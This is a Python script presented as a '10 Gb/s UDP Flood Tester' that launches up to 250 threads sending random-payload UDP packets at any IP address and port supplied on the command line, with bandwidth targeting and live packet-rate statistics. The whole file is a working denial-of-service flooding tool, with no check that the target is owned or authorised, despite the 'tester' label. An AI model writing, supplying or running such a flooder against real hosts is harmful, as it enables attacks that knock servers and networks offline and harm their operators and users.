#!/usr/bin/env python3
"""
10 Gb/s UDP Flood Tester - Server Configuration
Optimized for high-speed network interfaces (10 Gb/s+)
"""

import socket
import random
import time
import sys
import threading
import multiprocessing
from argparse import ArgumentParser

# 10 Gb/s Performance Constants
MAX_PACKET_SIZE = 1472  # Ethernet MTU (1500 - 28 byte headers)
THREADS_PER_CORE = 4    # Optimal threads per CPU core
SOCKET_BUFFER_SIZE = 4 * 1024 * 1024  # 4MB socket buffer

class UDPFlooder:
    def __init__(self, target_ip, target_port, duration, bandwidth_gbps=10):
        """
        10 Gb/s Optimized UDP Flooder
        
        Args:
            target_ip (str): Target server IP
            target_port (int): Target port
            duration (int): Test duration in seconds
            bandwidth_gbps (int): Target bandwidth in Gb/s
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.bandwidth_gbps = bandwidth_gbps
        
        # Auto-configure for 10Gb/s
        self.packet_size = MAX_PACKET_SIZE
        self.thread_count = self.calculate_optimal_threads()
        self.packets_sent = 0
        self.running = True
        self.payload = random._urandom(self.packet_size)
        
        # Calculate packet rate for target bandwidth
        self.target_pps = self.calculate_target_pps()
        print(self.get_config_summary())

    def calculate_optimal_threads(self):
        """Calculate threads based on CPU cores and target bandwidth"""
        cores = multiprocessing.cpu_count()
        base_threads = cores * THREADS_PER_CORE
        
        # Scale threads for 10Gb/s
        if self.bandwidth_gbps >= 10:
            return min(base_threads * 4, 250)  # Cap at 250 threads
        return base_threads

    def calculate_target_pps(self):
        """Calculate packets per second needed for target bandwidth"""
        bits_per_packet = (self.packet_size + 28) * 8  # +28 for headers
        return (self.bandwidth_gbps * 1_000_000_000) / bits_per_packet

    def get_config_summary(self):
        """Return configuration summary"""
        return f"""
⚡ 10 Gb/s UDP Flood Configuration ⚡
----------------------------------
Target: {self.target_ip}:{self.target_port}
Duration: {self.duration} seconds
Bandwidth Target: {self.bandwidth_gbps} Gb/s
Packet Size: {self.packet_size} bytes
Threads: {self.thread_count} (Auto-configured)
Target Packet Rate: {self.target_pps:,.0f} pkt/s
Estimated Data: {(self.target_pps * self.duration * self.packet_size) / (1024**3):.2f} GB
----------------------------------
"""

    def send_udp(self):
        """High-performance UDP sending routine"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Socket optimization for 10Gb/s
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_BUFFER_SIZE)
        
        # Rate control variables
        packets_per_thread = self.target_pps // self.thread_count
        interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
        
        while self.running:
            try:
                sock.sendto(self.payload, (self.target_ip, self.target_port))
                self.packets_sent += 1
                time.sleep(interval)  # Precision rate control
            except Exception as e:
                print(f"[ERROR] Send failed: {str(e)}")
                break

    def start(self):
        """Start the flood with performance monitoring"""
        threads = []
        start_time = time.time()
        
        # Start optimized threads
        for _ in range(self.thread_count):
            t = threading.Thread(target=self.send_udp)
            t.daemon = True
            t.start()
            threads.append(t)

        # Real-time monitoring
        try:
            while time.time() - start_time < self.duration:
                time.sleep(0.5)
                elapsed = time.time() - start_time
                current_pps = self.packets_sent / elapsed
                current_gbps = (current_pps * (self.packet_size + 28) * 8) / 1_000_000_000
                
                sys.stdout.write(
                    f"\r📦 Packets: {self.packets_sent:,} | "
                    f"⚡ Speed: {current_pps:,.0f} pkt/s | "
                    f"💻 {current_gbps:.2f}/{self.bandwidth_gbps} Gb/s | "
                    f"Threads: {threading.active_count() - 1}"
                )
                sys.stdout.flush()
                
        except KeyboardInterrupt:
            print("\n🛑 Stopping flood...")
        
        self.running = False
        for t in threads:
            t.join(timeout=1)

        # Final statistics
        total_time = time.time() - start_time
        self.print_final_stats(total_time)

    def print_final_stats(self, total_time):
        """Print final performance statistics"""
        total_data = (self.packets_sent * (self.packet_size + 28)) / (1024 ** 3)  # GB
        avg_pps = self.packets_sent / total_time
        avg_gbps = (self.packets_sent * (self.packet_size + 28) * 8) / (total_time * 1_000_000_000)
        
        print("\n🔥 Flood Complete 🔥")
        print(f"⏱ Duration: {total_time:.2f}s")
        print(f"📦 Total Packets: {self.packets_sent:,}")
        print(f"💾 Data Sent: {total_data:.2f} GB")
        print(f"⚡ Average Rate: {avg_pps:,.0f} pkt/s | {avg_gbps:.2f} Gb/s")
        print(f"🎯 Target vs Actual: {self.bandwidth_gbps:.1f}G vs {avg_gbps:.2f}G")
        print(f"🧵 Threads Used: {self.thread_count}")

if __name__ == "__main__":
    parser = ArgumentParser(description="10 Gb/s UDP Flood Tester - Server Configuration")
    
    # Required arguments
    parser.add_argument("target_ip", help="Target server IP address")
    parser.add_argument("target_port", type=int, help="Target UDP port")
    
    # Performance parameters
    parser.add_argument("-d", "--duration", type=int, default=30,
                      help="Test duration in seconds (default: 30)")
    parser.add_argument("-b", "--bandwidth", type=int, default=10,
                      help="Target bandwidth in Gb/s (default: 10)")
    
    args = parser.parse_args()

    # Verify system capabilities
    if not sys.platform.startswith('linux'):
        print("⚠️ Warning: For maximum performance, use Linux kernel with tuned network stack")

    flooder = UDPFlooder(
        target_ip=args.target_ip,
        target_port=args.target_port,
        duration=args.duration,
        bandwidth_gbps=args.bandwidth
    )
    
    try:
        flooder.start()
    except KeyboardInterrupt:
        print("\n[!] Test stopped by user")
        sys.exit(0)